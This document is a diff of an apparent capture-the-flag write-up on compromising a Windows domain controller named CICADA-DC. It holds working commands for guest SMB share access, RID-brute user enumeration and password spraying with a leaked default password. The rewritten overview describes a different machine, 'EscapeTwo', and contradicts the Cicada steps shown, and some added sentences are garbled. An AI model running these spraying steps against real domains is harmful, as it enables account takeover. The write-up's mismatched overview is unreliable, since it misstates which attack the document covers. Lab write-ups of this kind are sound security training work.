@@ -15,7 +15,7 @@ tools_used: [nmap]
 
 ## Overview
 
-Complete domain compromise through default password discovery and SeBackupPrivilege abuse for registry extraction.
+`EscapeTwo` is an easy difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. We leverage these credentials to access a file share containing a corrupted Excel document. By modifying its byte structure, we extract credentials. These are then sprayed across the domain, revealing valid credentials for a user with access to `MSSQL`, granting us initial access. System enumeration reveals `SQL` credentials, which are sprayed to obtain `WinRM` access. Further domain analysis shows the user has write owner rights over an account managing `ADCS`. This is used to enumerate `ADCS`, revealing a misconfiguration in Active Directory Certificate Services. Exploiting this misconfiguration allows us to retrieve the `Administrator` account hash, ultimately leading to complete domain compromise. 
 
 ```mermaid
 flowchart TD
@@ -96,7 +96,7 @@ SMB         10.10.11.35     445    CICADA-DC        SYSVOL                      
 
 ### Default Password Discovery
 
-HR share contained organizational notice with default password for new employees:
+The "HR" share contained an a text file that I downloaded.
 ```bash
 smbclient -U 'guest' -p ''  \\\\10.10.11.35\\HR
 
@@ -113,7 +113,7 @@ getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (16.5 KiloBy
 smb: \> exit
 ```
 
-Default password found in the note.
+The file contained a note to new employees containing a default password `Cicada$M6Corpb*@Lp#nZp!8`.
 ```
 cat Notice\ from\ HR.txt 
 
@@ -122,14 +122,14 @@ Your default password is: Cicada$M6Corpb*@Lp#nZp!8
 ...
 ```
 
-Saved the password to a file:
+I saved the password to a file `creds.txt`:
 ```bash
 echo 'Cicada$M6Corpb*@Lp#nZp!8' > creds.txt
 ```
 
 ### User Enumeration
 
-RID cycling enumeration built target user list for password spraying:
+ I then built target user list for password spraying RID cycling enumeration:
 ```bash
 nxc smb 'CICADA-DC' -u 'guest' -p '' --rid-brute | awk '{print $6}' | cut -d '\' -f2 > potential-users.txt
 ```
@@ -140,7 +140,7 @@ nxc smb 'CICADA-DC' -u 'guest' -p '' --rid-brute | awk '{print $6}' | cut -d '\'
 
 ### Password Spraying Attack
 
-Password spraying the discovered default password against enumerated users revealed multiple valid accounts, including additional credentials in user descriptions:
+Password spraying the discovered default password against enumerated potential users revealed multiple valid accounts. :
 ```bash
 nxc ldap 'CICADA-DC' -u potential-users.txt -p creds.txt --active-users 
 
